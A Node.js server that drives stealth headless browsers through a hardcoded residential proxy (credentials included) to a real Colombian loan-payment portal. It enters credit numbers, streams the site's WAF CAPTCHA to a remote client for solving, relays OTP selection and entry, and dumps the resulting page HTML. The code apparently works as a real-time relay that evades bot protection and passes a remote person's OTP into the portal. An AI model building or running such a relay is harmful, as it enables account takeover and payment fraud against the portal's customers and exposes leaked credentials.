const express = require("express");
const cors = require("cors");
const path = require("path");
const http = require("http");
const { WebSocketServer } = require("ws");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");

puppeteer.use(StealthPlugin());

const app = express();
app.use(cors());
app.use(express.json({ limit: "10mb" }));
app.use(express.static(path.join(__dirname)));

// ============================================================
// GEONODE PROXY RESIDENCIAL COLOMBIA
// ============================================================
const PROXY = {
  host: "proxy.geonode.io",
  port: 9000,
  user: "geonode_PKlL1yvoTG-country-co",
  pass: "605d224e-19b6-4baa-8107-296ee7d836f5",
};

// URL REAL del portal de pagos de Mobilize
const MOBILIZE_URL = "https://www.mobilize-fs.com.co/portal-pagos/";

// ============================================================
// POOL DE NAVEGADORES PRE-CALENTADOS
// ============================================================
const warmPool = [];
const POOL_SIZE = 2;
const sessions = new Map();

async function launchBrowser() {
  console.log("[POOL] Lanzando navegador...");
  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || undefined,
    args: [
      `--proxy-server=http://${PROXY.host}:${PROXY.port}`,
      "--no-sandbox",
      "--disable-setuid-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      "--single-process",
      "--no-zygote",
      "--window-size=1366,768",
    ],
  });
  return browser;
}

async function warmUp() {
  try {
    const browser = await launchBrowser();
    const page = await browser.newPage();

    await page.authenticate({ username: PROXY.user, password: PROXY.pass });
    await page.setUserAgent(
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    );
    await page.setViewport({ width: 1366, height: 768 });

    console.log("[POOL] Navegando a Mobilize...");
    await page.goto(MOBILIZE_URL, { waitUntil: "networkidle2", timeout: 60000 });

    // Esperar input de crédito (Angular Material)
    await page.waitForSelector("#otp-contract", { timeout: 30000 });
    console.log("[POOL] Página lista, input #otp-contract encontrado.");

    warmPool.push({ browser, page, createdAt: Date.now() });
    console.log(`[POOL] Pool: ${warmPool.length}/${POOL_SIZE} listos.`);
  } catch (err) {
    console.error("[POOL] Error pre-calentando:", err.message);
  }
}

async function fillPool() {
  while (warmPool.length < POOL_SIZE) {
    await warmUp();
  }
}

async function takeFromPool() {
  if (warmPool.length > 0) {
    const warm = warmPool.shift();
    console.log(`[POOL] Tomado del pool. Quedan: ${warmPool.length}`);
    // Rellenar en background
    fillPool().catch(() => {});
    return warm;
  }
  // Pool vacío — crear uno nuevo
  console.log("[POOL] Pool vacío, creando nuevo...");
  const browser = await launchBrowser();
  const page = await browser.newPage();
  await page.authenticate({ username: PROXY.user, password: PROXY.pass });
  await page.setUserAgent(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
  );
  await page.setViewport({ width: 1366, height: 768 });
  await page.goto(MOBILIZE_URL, { waitUntil: "networkidle2", timeout: 60000 });
  await page.waitForSelector("#otp-contract", { timeout: 30000 });
  return { browser, page, createdAt: Date.now() };
}

async function destroySession(sessionId) {
  const s = sessions.get(sessionId);
  if (s) {
    try { await s.browser.close(); } catch (e) {}
    sessions.delete(sessionId);
    console.log(`[${sessionId}] Sesión cerrada.`);
  }
}

// Limpiar sesiones viejas (>15 min)
setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions) {
    if (now - s.createdAt > 15 * 60 * 1000) destroySession(id);
  }
}, 60000);

// Limpiar pool viejo (>10 min sin usar)
setInterval(() => {
  const now = Date.now();
  while (warmPool.length > 0 && now - warmPool[0].createdAt > 10 * 60 * 1000) {
    const old = warmPool.shift();
    old.browser.close().catch(() => {});
    console.log("[POOL] Navegador viejo descartado.");
  }
  fillPool().catch(() => {});
}, 60000);

// ============================================================
// HELPER: Screenshot solo del CAPTCHA
// ============================================================
async function screenshotCaptcha(page) {
  const captchaInfo = await page.evaluate(() => {
    // Buscar por selectores conocidos de AWS WAF CAPTCHA
    const selectors = [
      ".waf-captcha__stage",
      "#captcha-container",
      "[class*='waf-captcha']",
      ".amzn-captcha-img-cell-container",
    ];
    for (const sel of selectors) {
      const cap = document.querySelector(sel);
      if (cap && cap.offsetHeight > 30) {
        const rect = cap.getBoundingClientRect();
        return { found: true, x: rect.x, y: rect.y, width: rect.width, height: rect.height };
      }
    }
    // Buscar por texto visible (fallback)
    const allDivs = document.querySelectorAll("div, section, form");
    for (const d of allDivs) {
      const txt = d.innerText?.toLowerCase() || "";
      if ((txt.includes("elija todo") || txt.includes("seleccione") || txt.includes("confirma que eres")) && d.offsetHeight > 100) {
        const rect = d.getBoundingClientRect();
        if (rect.width > 200) return { found: true, x: rect.x, y: rect.y, width: rect.width, height: rect.height };
      }
    }
    return { found: false };
  });

  if (!captchaInfo.found) return { found: false, screenshot: null, bounds: null };

  const padding = 10;
  const screenshot = await page.screenshot({
    encoding: "base64",
    clip: {
      x: Math.max(0, captchaInfo.x - padding),
      y: Math.max(0, captchaInfo.y - padding),
      width: Math.min(captchaInfo.width + padding * 2, 1366),
      height: Math.min(captchaInfo.height + padding * 2, 768),
    },
  });

  return {
    found: true,
    screenshot: `data:image/png;base64,${screenshot}`,
    bounds: { x: captchaInfo.x, y: captchaInfo.y, width: captchaInfo.width, height: captchaInfo.height },
  };
}

// ============================================================
// ENDPOINTS
// ============================================================

// 1. INICIAR — Llena crédito, clic Continuar, extrae opciones OTP
app.post("/api/start", async (req, res) => {
  const { creditNumber } = req.body;
  if (!creditNumber) return res.status(400).json({ error: "creditNumber requerido" });

  const sessionId = "s_" + Date.now() + "_" + Math.random().toString(36).slice(2, 8);

  try {
    const { browser, page } = await takeFromPool();
    sessions.set(sessionId, { browser, page, id: sessionId, createdAt: Date.now() });

    // Llenar el campo de crédito
    console.log(`[${sessionId}] Llenando crédito: ${creditNumber}`);
    const input = await page.$("#otp-contract");
    await input.click({ clickCount: 3 });
    await input.type(creditNumber, { delay: 40 });
    await new Promise((r) => setTimeout(r, 800));

    // Clic en CONTINUAR automáticamente
    console.log(`[${sessionId}] Clic en Continuar...`);
    await page.evaluate(() => {
      const btns = [...document.querySelectorAll("button[type='submit'], button.otp-form__primary, .mat-flat-button")];
      const b = btns.find((el) => el.innerText.toLowerCase().includes("continuar"));
      if (b) b.click();
    });

    // Esperar a que cargue la siguiente vista (opciones OTP)
    await new Promise((r) => setTimeout(r, 4000));

    // Extraer opciones de envío OTP (radio buttons, botones, cards, etc.)
    const otpOptions = await page.evaluate(() => {
      const options = [];
      // Buscar radio buttons, mat-radio, cards clickeables, botones de opción
      const radios = document.querySelectorAll("mat-radio-button, input[type='radio'], .mat-radio-button");
      radios.forEach((r, i) => {
        const label = r.innerText || r.getAttribute("aria-label") || r.closest("label")?.innerText || "";
        const value = r.querySelector("input")?.value || r.getAttribute("value") || i.toString();
        if (label.trim()) options.push({ type: "radio", index: i, label: label.trim(), value });
      });

      // Buscar botones/cards que digan SMS, correo, email, celular, etc.
      if (options.length === 0) {
        const allClickable = document.querySelectorAll("button, .mat-card, [role='button'], mat-card, .otp-option, .channel-option, a.mat-list-item, mat-list-option, .mat-selection-list mat-list-option");
        allClickable.forEach((el, i) => {
          const txt = el.innerText.toLowerCase();
          if (txt.includes("sms") || txt.includes("correo") || txt.includes("email") ||
              txt.includes("celular") || txt.includes("mensaje") || txt.includes("teléfono") ||
              txt.includes("mail") || txt.includes("enviar")) {
            options.push({ type: "button", index: i, label: el.innerText.trim(), value: el.innerText.trim() });
          }
        });
      }

      // Capturar también el texto visible de la página para contexto
      const bodyText = document.body.innerText.substring(0, 2000);

      return { options, bodyText, url: window.location.href };
    });

    // Si hay CAPTCHA visible, screenshot SOLO del elemento CAPTCHA
    const captchaInfo = await page.evaluate(() => {
      const selectors = [
        ".waf-captcha__stage",
        "#captcha-container",
        "[class*='captcha']",
        "#amzn-captcha-verify-image",
        ".amzn-captcha-img-cell-container",
      ];
      for (const sel of selectors) {
        const cap = document.querySelector(sel);
        if (cap && cap.offsetHeight > 30) {
          const rect = cap.getBoundingClientRect();
          return {
            found: true,
            x: rect.x,
            y: rect.y,
            width: rect.width,
            height: rect.height,
            selector: sel,
          };
        }
      }
      // Buscar por texto "captcha" o "bolsas" o "seleccione" en la página
      const allDivs = document.querySelectorAll("div, section, form");
      for (const d of allDivs) {
        const txt = d.innerText?.toLowerCase() || "";
        if ((txt.includes("captcha") || txt.includes("elija") || txt.includes("seleccione") || txt.includes("confirma que eres")) && d.offsetHeight > 100) {
          const rect = d.getBoundingClientRect();
          if (rect.width > 200) {
            return {
              found: true,
              x: rect.x,
              y: rect.y,
              width: rect.width,
              height: rect.height,
              selector: "text-match",
            };
          }
        }
      }
      return { found: false };
    });

    let screenshot = null;
    let captchaBounds = null;
    if (captchaInfo.found) {
      // Screenshot SOLO del área del CAPTCHA
      screenshot = await page.screenshot({
        encoding: "base64",
        clip: {
          x: Math.max(0, captchaInfo.x - 10),
          y: Math.max(0, captchaInfo.y - 10),
          width: Math.min(captchaInfo.width + 20, 1366),
          height: Math.min(captchaInfo.height + 20, 768),
        },
      });
      screenshot = `data:image/png;base64,${screenshot}`;
      captchaBounds = {
        x: captchaInfo.x,
        y: captchaInfo.y,
        width: captchaInfo.width,
        height: captchaInfo.height,
      };
    }

    console.log(`[${sessionId}] OTP opts: ${otpOptions.options.length}, CAPTCHA: ${captchaInfo.found} (${captchaInfo.selector || 'none'})`);

    res.json({
      sessionId,
      otpOptions: otpOptions.options,
      bodyText: otpOptions.bodyText,
      url: otpOptions.url,
      hasCaptcha: captchaInfo.found,
      screenshot,
      captchaBounds,
    });

  } catch (err) {
    console.error(`[${sessionId}] Error start:`, err.message);
    await destroySession(sessionId);
    res.status(500).json({ error: err.message });
  }
});

// 1b. SELECCIONAR MÉTODO OTP — El usuario escogió SMS o correo
app.post("/api/select-otp", async (req, res) => {
  const { sessionId, optionIndex, optionType, optionValue } = req.body;
  const session = sessions.get(sessionId);
  if (!session) return res.status(404).json({ error: "Sesión no encontrada" });

  try {
    const page = session.page;

    // Hacer clic en la opción que el usuario escogió
    console.log(`[${sessionId}] Seleccionando OTP: ${optionType} index=${optionIndex} val=${optionValue}`);

    if (optionType === "radio") {
      await page.evaluate((idx) => {
        const radios = document.querySelectorAll("mat-radio-button, input[type='radio'], .mat-radio-button");
        if (radios[idx]) radios[idx].click();
      }, optionIndex);
    } else {
      // Click en botón/card por texto
      await page.evaluate((val) => {
        const allClickable = document.querySelectorAll("button, .mat-card, [role='button'], mat-card, .otp-option, .channel-option, a.mat-list-item, mat-list-option, .mat-selection-list mat-list-option");
        const match = [...allClickable].find((el) => el.innerText.trim() === val);
        if (match) match.click();
      }, optionValue);
    }

    await new Promise((r) => setTimeout(r, 1500));

    // Buscar y hacer clic en botón de enviar/continuar si existe
    await page.evaluate(() => {
      const btns = [...document.querySelectorAll("button[type='submit'], button.mat-flat-button, .mat-flat-button")];
      const b = btns.find((el) => {
        const txt = el.innerText.toLowerCase();
        return txt.includes("enviar") || txt.includes("continuar") || txt.includes("siguiente");
      });
      if (b && !b.disabled) b.click();
    });

    await new Promise((r) => setTimeout(r, 3000));

    // Verificar si hay CAPTCHA ahora
    const captchaResult = await screenshotCaptcha(page);

    const bodyText = await page.evaluate(() => document.body.innerText.substring(0, 2000));

    console.log(`[${sessionId}] OTP seleccionado. CAPTCHA: ${captchaResult.found}`);

    res.json({
      success: true,
      hasCaptcha: captchaResult.found,
      screenshot: captchaResult.screenshot,
      captchaBounds: captchaResult.bounds,
      bodyText,
    });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 1c. DETECTAR ESTADO — ¿Hay opciones OTP o CAPTCHA?
app.post("/api/detect-state", async (req, res) => {
  const { sessionId } = req.body;
  const session = sessions.get(sessionId);
  if (!session) return res.status(404).json({ error: "Sesión no encontrada" });

  try {
    const page = session.page;

    const otpOptions = await page.evaluate(() => {
      const options = [];
      const radios = document.querySelectorAll("mat-radio-button, input[type='radio'], .mat-radio-button");
      radios.forEach((r, i) => {
        const label = r.innerText || r.getAttribute("aria-label") || r.closest("label")?.innerText || "";
        const value = r.querySelector("input")?.value || r.getAttribute("value") || i.toString();
        if (label.trim()) options.push({ type: "radio", index: i, label: label.trim(), value });
      });
      if (options.length === 0) {
        const allClickable = document.querySelectorAll("button, .mat-card, [role='button'], mat-card, .otp-option, .channel-option, a.mat-list-item, mat-list-option");
        allClickable.forEach((el, i) => {
          const txt = el.innerText.toLowerCase();
          if (txt.includes("sms") || txt.includes("correo") || txt.includes("email") ||
              txt.includes("celular") || txt.includes("mensaje") || txt.includes("teléfono")) {
            options.push({ type: "button", index: i, label: el.innerText.trim(), value: el.innerText.trim() });
          }
        });
      }
      return options;
    });

    const captchaResult = await screenshotCaptcha(page);

    const bodyText = await page.evaluate(() => document.body.innerText.substring(0, 2000));

    res.json({ otpOptions, hasCaptcha: captchaResult.found, screenshot: captchaResult.screenshot, captchaBounds: captchaResult.bounds, bodyText });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 2. SCREENSHOT (del CAPTCHA si está visible, si no fullpage)
app.post("/api/screenshot", async (req, res) => {
  const { sessionId } = req.body;
  const session = sessions.get(sessionId);
  if (!session) return res.status(404).json({ error: "Sesión no encontrada" });

  try {
    const captchaResult = await screenshotCaptcha(session.page);
    if (captchaResult.found) {
      res.json({ screenshot: captchaResult.screenshot, captchaBounds: captchaResult.bounds });
    } else {
      const screenshot = await session.page.screenshot({ encoding: "base64", fullPage: false });
      res.json({ screenshot: `data:image/png;base64,${screenshot}` });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 3. CLICK en coordenadas del CAPTCHA (relativas al elemento)
app.post("/api/click", async (req, res) => {
  const { sessionId, x, y, captchaBounds } = req.body;
  const session = sessions.get(sessionId);
  if (!session) return res.status(404).json({ error: "Sesión no encontrada" });

  try {
    // Si vienen bounds del CAPTCHA, sumar el offset para click absoluto en la página
    let absX = x;
    let absY = y;
    if (captchaBounds) {
      absX = captchaBounds.x + x;
      absY = captchaBounds.y + y;
    }

    console.log(`[${sessionId}] Click CAPTCHA: rel(${x},${y}) → abs(${absX},${absY})`);
    await session.page.mouse.click(absX, absY);
    await new Promise((r) => setTimeout(r, 800));

    // Re-screenshot solo del CAPTCHA
    const captchaInfo = await session.page.evaluate(() => {
      const selectors = [".waf-captcha__stage", "#captcha-container", "[class*='captcha']"];
      for (const sel of selectors) {
        const cap = document.querySelector(sel);
        if (cap && cap.offsetHeight > 30) {
          const rect = cap.getBoundingClientRect();
          return { found: true, x: rect.x, y: rect.y, width: rect.width, height: rect.height };
        }
      }
      const allDivs = document.querySelectorAll("div, section, form");
      for (const d of allDivs) {
        const txt = d.innerText?.toLowerCase() || "";
        if ((txt.includes("captcha") || txt.includes("elija") || txt.includes("seleccione") || txt.includes("confirma que eres")) && d.offsetHeight > 100) {
          const rect = d.getBoundingClientRect();
          if (rect.width > 200) return { found: true, x: rect.x, y: rect.y, width: rect.width, height: rect.height };
        }
      }
      return { found: false };
    });

    let screenshot;
    let newBounds = null;
    if (captchaInfo.found) {
      screenshot = await session.page.screenshot({
        encoding: "base64",
        clip: {
          x: Math.max(0, captchaInfo.x - 10),
          y: Math.max(0, captchaInfo.y - 10),
          width: Math.min(captchaInfo.width + 20, 1366),
          height: Math.min(captchaInfo.height + 20, 768),
        },
      });
      newBounds = { x: captchaInfo.x, y: captchaInfo.y, width: captchaInfo.width, height: captchaInfo.height };
    } else {
      screenshot = await session.page.screenshot({ encoding: "base64", fullPage: false });
    }

    res.json({
      screenshot: `data:image/png;base64,${screenshot}`,
      captchaBounds: newBounds,
      captchaStillVisible: captchaInfo.found,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 4. CLICK BOTÓN por texto
app.post("/api/click-button", async (req, res) => {
  const { sessionId, text } = req.body;
  const session = sessions.get(sessionId);
  if (!session) return res.status(404).json({ error: "Sesión no encontrada" });

  try {
    const page = session.page;
    const clicked = await page.evaluate((btnText) => {
      const btns = [...document.querySelectorAll("button, a, [role='button'], .mat-flat-button")];
      const b = btns.find((el) => el.innerText.toLowerCase().includes(btnText.toLowerCase()));
      if (b) { b.click(); return true; }
      return false;
    }, text);

    await new Promise((r) => setTimeout(r, 2000));
    const screenshot = await page.screenshot({ encoding: "base64", fullPage: false });
    res.json({ clicked, screenshot: `data:image/png;base64,${screenshot}` });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 5. ESCRIBIR en un campo (para OTP)
app.post("/api/type", async (req, res) => {
  const { sessionId, selector, text } = req.body;
  const session = sessions.get(sessionId);
  if (!session) return res.status(404).json({ error: "Sesión no encontrada" });

  try {
    const page = session.page;
    if (selector) {
      const el = await page.waitForSelector(selector, { timeout: 10000 });
      await el.click({ clickCount: 3 });
      await el.type(text, { delay: 40 });
    } else {
      await page.keyboard.type(text, { delay: 40 });
    }
    await new Promise((r) => setTimeout(r, 1000));
    const screenshot = await page.screenshot({ encoding: "base64", fullPage: false });
    res.json({ screenshot: `data:image/png;base64,${screenshot}` });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 6. EXTRAER DATOS de la página
app.post("/api/extract", async (req, res) => {
  const { sessionId } = req.body;
  const session = sessions.get(sessionId);
  if (!session) return res.status(404).json({ error: "Sesión no encontrada" });

  try {
    const data = await session.page.evaluate(() => ({
      url: window.location.href,
      title: document.title,
      text: document.body.innerText,
      html: document.body.innerHTML.substring(0, 15000),
    }));
    res.json(data);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 7. CERRAR SESIÓN
app.post("/api/close", async (req, res) => {
  const { sessionId } = req.body;
  await destroySession(sessionId);
  res.json({ ok: true });
});

// Health
app.get("/api/health", (req, res) => {
  res.json({ status: "ok", sessions: sessions.size, pool: warmPool.length });
});

// ============================================================
// WEBSOCKET MIRROR — espejo del CAPTCHA en tiempo real
// ============================================================
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: "/ws" });

wss.on("connection", (ws) => {
  let mirrorInterval = null;
  let wsSessionId = null;

  ws.on("message", async (raw) => {
    try {
      const msg = JSON.parse(raw);

      // START MIRROR — empezar a enviar frames del CAPTCHA
      if (msg.type === "start-mirror") {
        wsSessionId = msg.sessionId;
        const session = sessions.get(wsSessionId);
        if (!session) { ws.send(JSON.stringify({ type: "error", msg: "Sesión no encontrada" })); return; }

        // Enviar frame inicial
        const initial = await screenshotCaptcha(session.page);
        if (initial.found) {
          ws.send(JSON.stringify({ type: "frame", screenshot: initial.screenshot, bounds: initial.bounds }));
        }

        // Loop: enviar frame cada 300ms (como video)
        mirrorInterval = setInterval(async () => {
          try {
            const s = sessions.get(wsSessionId);
            if (!s || ws.readyState !== 1) { clearInterval(mirrorInterval); return; }
            const frame = await screenshotCaptcha(s.page);
            if (frame.found) {
              ws.send(JSON.stringify({ type: "frame", screenshot: frame.screenshot, bounds: frame.bounds }));
            } else {
              // CAPTCHA desapareció
              ws.send(JSON.stringify({ type: "captcha-gone" }));
              clearInterval(mirrorInterval);
              mirrorInterval = null;
            }
          } catch (e) {}
        }, 300);
      }

      // CLICK — usuario hizo clic en el CAPTCHA
      if (msg.type === "click") {
        const session = sessions.get(wsSessionId || msg.sessionId);
        if (!session) return;

        let absX = msg.x, absY = msg.y;
        if (msg.bounds) {
          absX = msg.bounds.x + msg.x;
          absY = msg.bounds.y + msg.y;
        }

        await session.page.mouse.click(absX, absY);
        await new Promise((r) => setTimeout(r, 400));

        // Enviar frame actualizado inmediatamente
        const frame = await screenshotCaptcha(session.page);
        if (frame.found) {
          ws.send(JSON.stringify({ type: "frame", screenshot: frame.screenshot, bounds: frame.bounds }));
        } else {
          ws.send(JSON.stringify({ type: "captcha-gone" }));
          if (mirrorInterval) { clearInterval(mirrorInterval); mirrorInterval = null; }
        }
      }

      // STOP MIRROR
      if (msg.type === "stop-mirror") {
        if (mirrorInterval) { clearInterval(mirrorInterval); mirrorInterval = null; }
      }

    } catch (e) {}
  });

  ws.on("close", () => {
    if (mirrorInterval) { clearInterval(mirrorInterval); mirrorInterval = null; }
  });
});

// ============================================================
// ARRANQUE
// ============================================================
const PORT = process.env.PORT || 3000;
server.listen(PORT, async () => {
  console.log(`Mobilize Puppeteer + Geonode + WS → http://localhost:${PORT}`);
  console.log("[POOL] Pre-calentando navegadores...");
  fillPool().catch((e) => console.error("[POOL] Error inicial:", e.message));
});
